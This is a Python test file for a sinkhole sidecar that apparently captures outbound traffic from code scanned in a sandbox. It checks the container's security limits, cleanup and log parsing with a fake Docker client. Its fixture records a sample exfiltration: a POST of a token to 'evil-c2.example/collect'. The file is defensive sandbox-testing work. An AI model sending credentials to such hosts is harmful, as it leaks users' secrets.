"""Sinkhole sidecar lifecycle hardening with a fake Docker client."""

from __future__ import annotations

import io
import json
import tarfile
import threading
from uuid import UUID

import pytest
from skill_sentry_cli.core.sandbox.sidecar import (
    MAX_SIDECAR_LOG_BYTES,
    SidecarError,
    SinkholeConfig,
    SinkholeSidecar,
    parse_sidecar_log,
)

SCAN_ID = UUID("77777777-7777-4777-8777-777777777777")
OBSERVATION = {
    "ts": "2026-10-22T12:00:00.123Z",
    "protocol": "http",
    "query_or_url": "POST http://evil-c2.example/collect",
    "body_b64": "dG9rZW49ZmFrZQ==",
    "headers": {"Host": "evil-c2.example"},
    "client": "172.30.77.3:12345",
    "responder_action": "200+secondary",
}


class _LogStream:
    def __init__(self, chunks: list[bytes]) -> None:
        self._chunks = chunks
        self.closed = False

    def __iter__(self):
        yield from self._chunks

    def close(self) -> None:
        self.closed = True


class _Container:
    def __init__(self, client: _Client, kwargs: dict, *, ready: bool, archive_ok: bool) -> None:
        self.client = client
        self.kwargs = kwargs
        self.ready = ready
        self.archive_ok = archive_ok
        self.status = "created"
        self.stopped = False
        self.removed = False
        self.archive: bytes | None = None
        self.log_lines: list[bytes] = []

    def put_archive(self, path: str, data: bytes) -> bool:
        self.client.events.append("archive")
        assert path == "/opt"
        with tarfile.open(fileobj=io.BytesIO(data), mode="r") as archive:
            names = archive.getnames()
            assert names == ["skillsentry_sidecar.py"]
            extracted = archive.extractfile("skillsentry_sidecar.py")
            assert extracted is not None
            self.archive = extracted.read()
        return self.archive_ok

    def start(self) -> None:
        self.client.events.append("start")
        self.status = "running"
        if self.ready:
            self.log_lines = [
                b'{"event":"ready","dns_port":53,"http_port":80}\n',
                (json.dumps(OBSERVATION) + "\n").encode(),
            ]

    def reload(self) -> None:
        return None

    def logs(self, **kwargs):
        self.client.events.append("logs")
        payload = b"".join(self.log_lines)
        if kwargs.get("stream"):
            return _LogStream([payload])
        return payload

    def stop(self, timeout: int = 1) -> None:
        self.client.events.append("stop")
        self.status = "exited"
        self.stopped = True

    def remove(self, force: bool = True, v: bool = True) -> None:
        self.client.events.append("remove")
        self.removed = True


class _Containers:
    def __init__(self, client: _Client) -> None:
        self.client = client

    def create(self, **kwargs):
        self.client.events.append("create")
        container = _Container(
            self.client,
            kwargs,
            ready=self.client.ready,
            archive_ok=self.client.archive_ok,
        )
        self.client.created.append(container)
        return container


class _Client:
    def __init__(self, *, ready: bool = True, archive_ok: bool = True) -> None:
        self.ready = ready
        self.archive_ok = archive_ok
        self.events: list[str] = []
        self.created: list[_Container] = []
        self.containers = _Containers(self)


class _Network:
    name = "skillsentry-sinkhole"


def test_start_archives_script_before_start_and_enforces_limits():
    client = _Client()
    sidecar = SinkholeSidecar(client, SinkholeConfig(timeout_s=0.5))
    sidecar.start(_Network(), SCAN_ID, image="sidecar:test")
    assert client.events[:3] == ["create", "archive", "start"]
    container = client.created[0]
    assert container.kwargs["image"] == "sidecar:test"
    assert container.kwargs["read_only"] is False
    assert container.kwargs["cap_drop"] == ["ALL"]
    assert container.kwargs["cap_add"] == ["NET_BIND_SERVICE"]
    assert container.kwargs["security_opt"] == ["no-new-privileges"]
    assert container.kwargs["mem_limit"] == "64m"
    assert container.kwargs["pids_limit"] == 32
    assert container.kwargs["nano_cpus"] == 250_000_000
    assert container.archive and b"def main" in container.archive

    observations = sidecar.stop()
    assert len(observations) == 1
    assert observations[0].protocol == "http"
    assert observations[0].body == b"token=fake"
    assert container.stopped is True
    assert client.events.count("logs") == 2
    assert client.events[-2:] == ["logs", "remove"]
    assert container.removed is True
    assert sidecar.stop() == []


def test_unready_sidecar_is_torn_down():
    client = _Client(ready=False)
    sidecar = SinkholeSidecar(client, SinkholeConfig(timeout_s=0.15))
    with pytest.raises(SidecarError, match="did not become ready"):
        sidecar.start(_Network(), SCAN_ID)
    container = client.created[0]
    assert container.stopped is True
    assert container.removed is True


def test_archive_failure_is_fatal_and_cleans_up():
    client = _Client(archive_ok=False)
    sidecar = SinkholeSidecar(client, SinkholeConfig(timeout_s=0.5))
    with pytest.raises(SidecarError, match="could not copy sidecar script"):
        sidecar.start(_Network(), SCAN_ID)
    container = client.created[0]
    assert container.stopped is True
    assert container.removed is True


def test_start_is_serialised_under_concurrency():
    client = _Client()
    sidecar = SinkholeSidecar(client, SinkholeConfig(timeout_s=0.5))
    barrier = threading.Barrier(2)
    errors: list[Exception] = []

    def run() -> None:
        try:
            barrier.wait(timeout=2)
            sidecar.start(_Network(), SCAN_ID)
        except Exception as exc:  # pragma: no cover - asserted below
            errors.append(exc)

    threads = [threading.Thread(target=run) for _ in range(2)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=5)
    assert not errors
    assert len(client.created) == 1
    sidecar.stop()


def test_log_read_is_bounded(monkeypatch: pytest.MonkeyPatch):
    from skill_sentry_cli.core.sandbox import sidecar as module

    huge = b"x" * (MAX_SIDECAR_LOG_BYTES + 4096)

    class BoundedContainer:
        def logs(self, **kwargs):
            return _LogStream([huge[: len(huge) // 2], huge[len(huge) // 2 :]])

    raw = module._read_logs(BoundedContainer(), stream=True)
    assert len(raw) <= MAX_SIDECAR_LOG_BYTES
    assert raw.endswith(b"x")


def test_parse_sidecar_log_caps_and_ignores_readiness():
    raw = b'{"event":"ready"}\n' + (json.dumps(OBSERVATION) + "\n").encode() + b"not json\n"
    observations = parse_sidecar_log(raw)
    assert len(observations) == 1
    assert observations[0].query_or_url.startswith("POST http://")
    assert observations[0].headers == {"Host": "evil-c2.example"}
